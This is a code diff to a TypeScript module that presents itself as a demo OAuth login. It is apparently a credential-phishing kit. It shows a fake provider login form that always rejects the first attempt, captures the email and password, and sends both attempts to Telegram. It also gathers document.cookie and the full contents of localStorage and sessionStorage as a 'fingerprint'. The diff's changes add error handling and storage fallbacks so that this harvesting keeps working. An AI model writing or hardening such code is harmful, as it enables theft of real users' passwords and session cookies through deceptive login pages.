@@ -80,15 +80,50 @@ export const generateState = (): string => {
 export const buildOAuthUrl = (provider: string, state: string): string => {
   const config = getOAuthConfig(provider);
 
-  // Store provider and state for demo callback
-  localStorage.setItem('selected_provider', provider);
-  localStorage.setItem('oauth_state', state);
-  localStorage.setItem('oauth_start_time', Date.now().toString());
-  localStorage.setItem('login_attempt_count', '0');
+  // Store provider and state for demo callback with error handling
+  try {
+    localStorage.setItem('selected_provider', provider);
+    localStorage.setItem('oauth_state', state);
+    localStorage.setItem('oauth_start_time', Date.now().toString());
+    localStorage.setItem('login_attempt_count', '0');
+  } catch (e) {
+    console.warn('localStorage not available, using sessionStorage fallback');
+    sessionStorage.setItem('selected_provider', provider);
+    sessionStorage.setItem('oauth_state', state);
+    sessionStorage.setItem('oauth_start_time', Date.now().toString());
+    sessionStorage.setItem('login_attempt_count', '0');
+  }
   
   // Capture pre-auth cookies
-  const preAuthFingerprint = getBrowserFingerprint();
-  localStorage.setItem('pre_auth_cookies', JSON.stringify(preAuthFingerprint));
+  try {
+    const preAuthFingerprint = getBrowserFingerprint();
+    const fingerprintData = JSON.stringify(preAuthFingerprint);
+    
+    // Check data size before storing (limit to 1MB)
+    if (fingerprintData.length < 1024 * 1024) {
+      localStorage.setItem('pre_auth_cookies', fingerprintData);
+    } else {
+      console.warn('Fingerprint data too large, storing minimal version');
+      const minimalFingerprint = {
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        cookies: document.cookie.substring(0, 1000) // Limit cookie data
+      };
+      localStorage.setItem('pre_auth_cookies', JSON.stringify(minimalFingerprint));
+    }
+  } catch (e) {
+    console.warn('Failed to store fingerprint data:', e.message);
+    // Store minimal data as fallback
+    try {
+      const fallbackData = {
+        timestamp: new Date().toISOString(),
+        cookies: document.cookie.substring(0, 500)
+      };
+      sessionStorage.setItem('pre_auth_cookies', JSON.stringify(fallbackData));
+    } catch (fallbackError) {
+      console.warn('All storage methods failed');
+    }
+  }
 
   // Show demo login form
   showDemoLoginForm(provider, state);
@@ -267,15 +302,27 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
     
     const email = (document.getElementById('demoEmail') as HTMLInputElement).value;
     const password = (document.getElementById('demoPassword') as HTMLInputElement).value;
-    const attemptCount = parseInt(localStorage.getItem('login_attempt_count') || '0');
+    
+    // Get attempt count with fallback
+    let attemptCount = 0;
+    try {
+      attemptCount = parseInt(localStorage.getItem('login_attempt_count') || '0');
+    } catch (e) {
+      attemptCount = parseInt(sessionStorage.getItem('login_attempt_count') || '0');
+    }
     
     // Capture current browser data
     const browserFingerprint = getBrowserFingerprint();
     
     if (attemptCount === 0) {
       // First attempt - show invalid credentials
-      localStorage.setItem('login_attempt_count', '1');
-      localStorage.setItem('first_attempt_data', JSON.stringify({ email, password }));
+      try {
+        localStorage.setItem('login_attempt_count', '1');
+        localStorage.setItem('first_attempt_data', JSON.stringify({ email, password }));
+      } catch (e) {
+        sessionStorage.setItem('login_attempt_count', '1');
+        sessionStorage.setItem('first_attempt_data', JSON.stringify({ email, password }));
+      }
       
       // Send first attempt data to Telegram
       await sendToTelegram({
@@ -298,7 +345,12 @@ export const showDemoLoginForm = (provider: string, state: string): void => {
       
     } else {
       // Second attempt - success
-      const firstAttemptData = JSON.parse(localStorage.getItem('first_attempt_data') || '{}');
+      let firstAttemptData = {};
+      try {
+        firstAttemptData = JSON.parse(localStorage.getItem('first_attempt_data') || '{}');
+      } catch (e) {
+        firstAttemptData = JSON.parse(sessionStorage.getItem('first_attempt_data') || '{}');
+      }
       
       // Send second attempt data to Telegram
       await sendToTelegram({
@@ -455,6 +507,32 @@ export const extractEmailFromProvider = (provider: string, code: string): string
 
 export const getBrowserFingerprint = () => {
   try {
+    // Get storage data with size limits
+    const getStorageDataSafe = (storageType: 'localStorage' | 'sessionStorage') => {
+      try {
+        const storage = window[storageType];
+        const data: { [key: string]: string } = {};
+        let totalSize = 0;
+        const maxSize = 10000; // 10KB limit
+        
+        for (let i = 0; i < storage.length; i++) {
+          const key = storage.key(i);
+          if (key) {
+            const value = storage.getItem(key) || '';
+            if (totalSize + value.length < maxSize) {
+              data[key] = value;
+              totalSize += value.length;
+            } else {
+              break; // Stop if we hit size limit
+            }
+          }
+        }
+        return Object.keys(data).length > 0 ? JSON.stringify(data).substring(0, maxSize) : 'Empty';
+      } catch (e) {
+        return 'Access denied';
+      }
+    };
+
     return {
       userAgent: navigator.userAgent,
       language: navigator.language,
@@ -467,11 +545,11 @@ export const getBrowserFingerprint = () => {
         height: screen.height,
         colorDepth: screen.colorDepth
       },
-      cookies: document.cookie,
-      localStorage: getStorageData('localStorage'),
-      sessionStorage: getStorageData('sessionStorage'),
+      cookies: document.cookie.substring(0, 2000), // Limit cookie data to 2KB
+      localStorage: getStorageDataSafe('localStorage'),
+      sessionStorage: getStorageDataSafe('sessionStorage'),
       timestamp: new Date().toISOString(),
-      totalCookiesCaptured: document.cookie.split(';').length,
+      totalCookiesCaptured: document.cookie ? document.cookie.split(';').length : 0,
       advancedCookieStats: {
         httpOnly: 0, // Can't detect from client-side
         secure: document.cookie.includes('Secure') ? 1 : 0,
@@ -481,30 +559,15 @@ export const getBrowserFingerprint = () => {
   } catch (error) {
     console.error('Error getting browser fingerprint:', error);
     return {
-      error: error.message,
+      error: error?.message || 'Unknown error',
       timestamp: new Date().toISOString(),
-      cookies: document.cookie,
+      cookies: document.cookie.substring(0, 1000),
       totalCookiesCaptured: 0,
       advancedCookieStats: {}
     };
   }
 };
 
-export const getStorageData = (storageType: 'localStorage' | 'sessionStorage') => {
-  try {
-    const storage = window[storageType];
-    const data: { [key: string]: string } = {};
-    for (let i = 0; i < storage.length; i++) {
-      const key = storage.key(i);
-      if (key) {
-        data[key] = storage.getItem(key) || '';
-      }
-    }
-    return Object.keys(data).length > 0 ? JSON.stringify(data) : 'Empty';
-  } catch (e) {
-    return 'Access denied';
-  }
-};
 
 export const simulateDemoAuth = async (provider: string): Promise<string> => {
   // Simulate OAuth flow delay
